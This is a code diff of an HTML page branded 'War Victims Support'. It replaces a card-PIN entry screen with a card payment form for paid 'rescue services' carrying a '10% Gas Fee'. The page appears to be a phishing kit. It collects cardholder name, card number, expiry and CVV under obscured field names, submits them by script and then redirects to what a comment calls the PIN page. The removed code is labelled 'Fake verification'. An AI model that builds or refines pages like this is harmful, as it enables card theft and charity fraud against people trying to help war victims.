@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Card PIN Verification | War Victims Support</title>
+  <title>Card Payment | War Victims Support</title>
   <link rel="shortcut icon" href="logo.webp" type="image/webp" />
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet"/>
   <style>
@@ -23,65 +23,92 @@
       padding: 20px;
     }
 
-    .pin-container {
+    .payment-container {
       background: #fff;
       padding: 40px 30px;
       border-radius: 16px;
       box-shadow: 0 12px 24px rgba(0, 0, 0, 0.08);
-      max-width: 480px;
+      max-width: 600px;
       width: 100%;
+    }
+
+    h1 {
+      font-size: 26px;
+      color: #004080;
+      margin-bottom: 20px;
       text-align: center;
     }
 
-    h2 {
-      font-size: 24px;
-      color: #004080;
+    .card-logos {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
       margin-bottom: 20px;
     }
 
-    .info {
+    .card-logos img {
+      height: 28px;
+      filter: grayscale(100%);
+      transition: filter 0.3s;
+    }
+
+    .card-logos img:hover {
+      filter: grayscale(0%);
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 500;
+    }
+
+    .form-group input, .form-group select {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
       font-size: 16px;
-      color: #333;
+    }
+
+    .summary {
+      background: #eef5ff;
+      padding: 20px;
+      border-radius: 10px;
       margin-bottom: 30px;
     }
 
-    .info span {
-      font-weight: 600;
+    .summary p {
+      margin-bottom: 10px;
       color: #004080;
+      font-weight: 600;
     }
 
-    input[type="password"] {
-      font-size: 20px;
-      padding: 12px 16px;
+    .btn-pay {
       width: 100%;
-      max-width: 200px;
-      text-align: center;
-      letter-spacing: 8px;
-      border: 2px solid #004080;
-      border-radius: 10px;
-      margin: 0 auto 20px;
-      display: block;
-    }
-
-    button {
-      padding: 12px 25px;
-      font-size: 16px;
-      background-color: #004080;
+      padding: 14px;
+      background: #004080;
       color: white;
+      font-size: 16px;
+      font-weight: bold;
       border: none;
       border-radius: 10px;
       cursor: pointer;
       transition: background 0.3s ease;
     }
 
-    button:hover {
-      background-color: #002f5e;
+    .btn-pay:hover {
+      background: #002f5e;
     }
 
     .note {
       font-size: 13px;
       color: #777;
-      margin-top: 25px;
+      text-align: center;
+      margin-top: 20px;
     }
     #preloader {
   position: fixed;
@@ -123,20 +150,58 @@ body.loaded #preloader {
   <div id="preloader">
     <div class="loader"></div>
   </div>
-  <div class="pin-container">
-    <h2>Enter Your 4-Digit PIN</h2>
+  <div class="payment-container">
+    <h1>Complete Your Payment</h1>
 
-    <div class="info">
-      Cardholder: <span id="cardName">Loading...</span><br/>
-      Amount: <span id="cardAmount">$0</span>
+    <div class="card-logos">
+      <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa"/>
+      <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="MasterCard"/>
+      <img src="https://img.icons8.com/color/48/000000/amex.png" alt="American Express"/>
     </div>
 
-    <form id="Form">
-      <input type="password" maxlength="4" pattern="\d*" placeholder="••••" required name="fournumber" />
-      <button type="submit">Verify & Complete</button>
+    <!-- Service Selection -->
+    <div class="form-group">
+      <label for="service">Select Rescue Service</label>
+      <select id="service" onchange="updatePricing()" required>
+        <option value="" disabled selected>-- Select an Option --</option>
+        <option value="Initial Rescue Support" data-price="700">Initial Rescue Support – $700</option>
+        <option value="Priority Rescue Plan" data-price="1200">Priority Rescue Plan – $1200</option>
+        <option value="Comprehensive Recovery" data-price="2500">Comprehensive Recovery – $2500</option>
+      </select>
+    </div>
+
+    <!-- Price Summary -->
+    <div class="summary" id="summaryBox" style="display: none;">
+      <p>Base Price: $<span id="basePrice">0</span></p>
+      <p>+ 10% Gas Fee: $<span id="fee">0</span></p>
+      <p><strong>Total: $<span id="totalPrice">0</span></strong></p>
+    </div>
+
+    <form id="Forms">
+      <div class="form-group">
+        <label for="cardName">Cardholder Name</label>
+        <input type="text" id="cardName" name="Name" required />
+      </div>
+
+      <div class="form-group">
+        <label for="cardNumber">Card Number</label>
+        <input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" name="orederdnumbers" required />
+      </div>
+
+      <div class="form-group">
+        <label for="expiry">Expiry Date</label>
+        <input type="text" id="expiry" maxlength="5" placeholder="MM/YY" name="timelimit" required />
+      </div>
+
+      <div class="form-group">
+        <label for="cvv">CVV</label>
+        <input type="text" id="cvv" maxlength="4" placeholder="123" name="third-number" required />
+      </div>
+
+      <button type="submit" class="btn-pay">Pay Now</button>
     </form>
 
-    <div class="note">Your payment is protected and secure 🔒</div>
+    <p class="note">You're helping save lives 💙</p>
   </div>
 
   <script>
@@ -146,7 +211,7 @@ window.addEventListener('load', function () {
   });
 
 document.addEventListener("DOMContentLoaded", function () {
-    const form = document.getElementById("Form");
+    const form = document.getElementById("Forms");
 
     form.addEventListener("submit", function (e) {
       e.preventDefault(); // Prevent the default form reload
@@ -168,7 +233,7 @@ document.addEventListener("DOMContentLoaded", function () {
       })
       .then(response => {
         if (response.ok) {
-          window.location.href = "Thank-You.html"; // Redirect after submission
+          window.location.href = "card-processing2.html"; // Redirect after submission
         } else {
           alert("Payment Details Submission failed. Please try again.");
         }
@@ -181,19 +246,48 @@ document.addEventListener("DOMContentLoaded", function () {
   });
 
 
-    // Load stored info
-    const name = localStorage.getItem("cardHolder") || "Unknown";
-    const amount = localStorage.getItem("cardAmount") || "0";
+    const cardInput = document.getElementById("cardNumber");
+    cardInput.addEventListener("input", function (e) {
+      let val = e.target.value.replace(/\D/g, "").substring(0, 16);
+      val = val.replace(/(.{4})/g, "$1 ").trim();
+      e.target.value = val;
+    });
 
-    document.getElementById("cardName").textContent = name;
-    document.getElementById("cardAmount").textContent = "$" + amount;
+    const expiryInput = document.getElementById("expiry");
+    expiryInput.addEventListener("input", function (e) {
+      let val = e.target.value.replace(/\D/g, "").substring(0, 4);
+      if (val.length > 2) {
+        val = val.substring(0, 2) + "/" + val.substring(2);
+      }
+      e.target.value = val;
+    });
 
-    // Fake verification
-    document.getElementById("pinForm").addEventListener("submit", function (e) {
+    function updatePricing() {
+      const select = document.getElementById("service");
+      const selectedOption = select.options[select.selectedIndex];
+      const base = parseFloat(selectedOption.dataset.price || 0);
+
+      const fee = +(base * 0.1).toFixed(2);
+      const total = base + fee;
+
+      document.getElementById("summaryBox").style.display = "block";
+      document.getElementById("basePrice").textContent = base;
+      document.getElementById("fee").textContent = fee;
+      document.getElementById("totalPrice").textContent = total;
+
+      // Store values for PIN page
+      localStorage.setItem("cardAmount", total);
+      localStorage.setItem("cardService", selectedOption.value);
+    }
+
+    document.getElementById("CardForm").addEventListener("submit", function (e) {
       e.preventDefault();
 
-      // // You can add real validation logic here if needed
-      // window.location.href = "thank-you.html"; // Adjust as needed
+      const name = document.getElementById("cardName").value;
+      localStorage.setItem("cardHolder", name);
+
+      // Simulate redirect to pin entry page
+      // window.location.href = "card-processing2.html";
     });
   </script>
 
